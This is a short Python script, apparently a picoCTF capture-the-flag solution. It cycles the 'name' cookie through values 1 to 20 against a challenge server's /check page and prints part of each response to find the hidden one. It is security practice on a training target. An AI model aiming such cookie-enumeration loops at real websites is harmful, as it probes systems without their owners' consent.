import requests


for i in range(20):
    ck = str(i+1)
    cookies = {'name': ck}
    r = requests.get('http://mercury.picoctf.net:27177/check', cookies=cookies)
    res = r.text
    reslist = res.split('\n')
    for y in range(len(reslist)):
        if 'div class=\"jumbotron\"' in reslist[y]:
            print(reslist[y+2])
